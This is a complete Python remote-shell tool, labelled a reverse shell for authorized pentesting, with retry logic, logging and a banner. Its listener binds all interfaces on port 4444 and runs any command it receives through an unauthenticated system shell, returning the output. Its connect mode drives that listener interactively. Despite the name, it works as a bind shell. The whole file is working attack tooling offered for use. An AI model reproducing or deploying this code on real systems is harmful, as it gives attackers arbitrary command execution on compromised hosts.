#!/usr/bin/env python3
"""
Enhanced Python Reverse Shell with Robust Error Handling
Author: Izumy
For authorized penetration testing only
"""

import socket
import subprocess
import sys
import argparse
import os
import time
import logging
from colorama import Fore, Style

class ReverseShellTool:
    def __init__(self):
        self.setup_logging()
        self.show_banner()
        
    def setup_logging(self):
        """Configure logging system"""
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s',
            filename='reverse_shell.log',
            filemode='a'
        )
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        logging.getLogger('').addHandler(console)
        
    def show_banner(self):
        """Display tool banner"""
        banner = f"""
        {Fore.RED}╔══════════════════════════════════════════╗
        ║{Fore.YELLOW}      PYTHON REVERSE SHELL TOOL           {Fore.RED}║
        ║{Fore.CYAN}      Author: Izumy                       {Fore.RED}║  
        ║{Fore.GREEN}      Version: 2.0                        {Fore.RED}║
        ║{Fore.MAGENTA}      For authorized pentesting only      {Fore.RED}║
        ╚══════════════════════════════════════════╝
        {Style.RESET_ALL}
        """
        print(banner)

    def validate_ip(self, ip):
        """Validate IP address format"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def validate_port(self, port):
        """Validate port number"""
        return 1 <= port <= 65535

    def execute_command(self, command):
        """Execute command with comprehensive error handling"""
        try:
            if command.lower().strip() == 'exit':
                return "exit"
                
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return f"Changed directory to: {os.getcwd()}"
                except FileNotFoundError:
                    return f"[!] Directory not found: {path}"
                except PermissionError:
                    return "[!] Permission denied"
                except Exception as e:
                    return f"[!] Error: {str(e)}"

            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            output, error = process.communicate()
            
            if process.returncode != 0:
                return f"[!] Error ({process.returncode}): {error.decode().strip()}"
            return output.decode('utf-8', errors='replace')
            
        except subprocess.SubprocessError as e:
            return f"[!] Subprocess error: {str(e)}"
        except UnicodeDecodeError:
            return "[!] Error decoding output (possibly binary data)"
        except Exception as e:
            return f"[!] Unexpected error: {str(e)}"

    def connect_to_host(self, host, port, max_retries=3):
        """Connect to listener with retry mechanism"""
        for attempt in range(max_retries):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                logging.info(f"Connected to {host}:{port}")
                return s
            except socket.timeout:
                logging.warning(f"Timeout connecting to {host}:{port} (attempt {attempt+1})")
                if attempt == max_retries - 1:
                    print(f"[!] Timeout: Couldn't connect to {host}:{port}")
                    sys.exit(1)
            except socket.gaierror:
                print("[!] Error: Invalid IP/Hostname")
                sys.exit(1)
            except ConnectionRefusedError:
                logging.warning(f"Connection refused by {host}:{port} (attempt {attempt+1})")
                if attempt == max_retries - 1:
                    print(f"[!] Connection refused by {host}:{port}")
                    print("[*] Make sure listener is running on target")
                    sys.exit(1)
            except Exception as e:
                logging.error(f"Connection error: {str(e)}")
                if attempt == max_retries - 1:
                    print(f"[!] Connection error: {str(e)}")
                    sys.exit(1)
            time.sleep(2)

    def start_listener(self, port):
        """Start listener with comprehensive error handling"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            try:
                s.bind(('0.0.0.0', port))
            except PermissionError:
                print(f"[!] Error: Can't bind to port {port} (need root?)")
                sys.exit(1)
            except OSError as e:
                if e.errno == 98:  # Address already in use
                    print(f"[!] Port {port} is already in use")
                    print("[*] Try another port or kill the process using it")
                    sys.exit(1)
                raise e
                
            s.listen(5)
            print(f"[*] Listening on 0.0.0.0:{port} (CTRL+C to exit)")
            logging.info(f"Listener started on port {port}")
            
            while True:
                try:
                    conn, addr = s.accept()
                    print(f"[+] Connection from {addr[0]}:{addr[1]}")
                    logging.info(f"New connection from {addr[0]}:{addr[1]}")
                    
                    while True:
                        try:
                            command = conn.recv(1024).decode().strip()
                            if not command:
                                break
                                
                            output = self.execute_command(command)
                            conn.send(output.encode())
                            
                        except ConnectionResetError:
                            print(f"[-] Connection closed by {addr[0]}")
                            logging.info(f"Connection closed by {addr[0]}")
                            break
                        except Exception as e:
                            print(f"[!] Error handling command: {str(e)}")
                            logging.error(f"Command handling error: {str(e)}")
                            conn.send(f"[!] Server error: {str(e)}".encode())
                            break
                            
                except KeyboardInterrupt:
                    print("\n[*] Shutting down listener...")
                    logging.info("Listener shutdown by user")
                    break
                except Exception as e:
                    print(f"[!] Error accepting connection: {str(e)}")
                    logging.error(f"Connection acceptance error: {str(e)}")
                    continue
                    
        except Exception as e:
            logging.critical(f"Listener fatal error: {str(e)}")
            print(f"[!] Fatal error: {str(e)}")
        finally:
            s.close()

def main():
    tool = ReverseShellTool()
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--listen', action='store_true', help='Start listener')
    parser.add_argument('-c', '--connect', help='Connect to host')
    parser.add_argument('-p', '--port', type=int, default=4444, help='Port number')
    
    try:
        args = parser.parse_args()
        
        if not tool.validate_port(args.port):
            print("[!] Invalid port number (must be 1-65535)")
            sys.exit(1)
            
        if args.listen:
            tool.start_listener(args.port)
        elif args.connect:
            if not tool.validate_ip(args.connect):
                print("[!] Invalid IP address format")
                sys.exit(1)
                
            s = tool.connect_to_host(args.connect, args.port)
            
            try:
                while True:
                    command = input("shell> ").strip()
                    if not command:
                        continue
                        
                    s.send(command.encode())
                    if command.lower() == 'exit':
                        break
                        
                    response = s.recv(8192).decode()
                    print(response)
                    
            except KeyboardInterrupt:
                print("\n[*] Exiting shell")
            except Exception as e:
                print(f"[!] Shell error: {str(e)}")
            finally:
                s.close()
        else:
            parser.print_help()
            
    except Exception as e:
        logging.critical(f"Fatal error: {str(e)}", exc_info=True)
        print(f"[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()
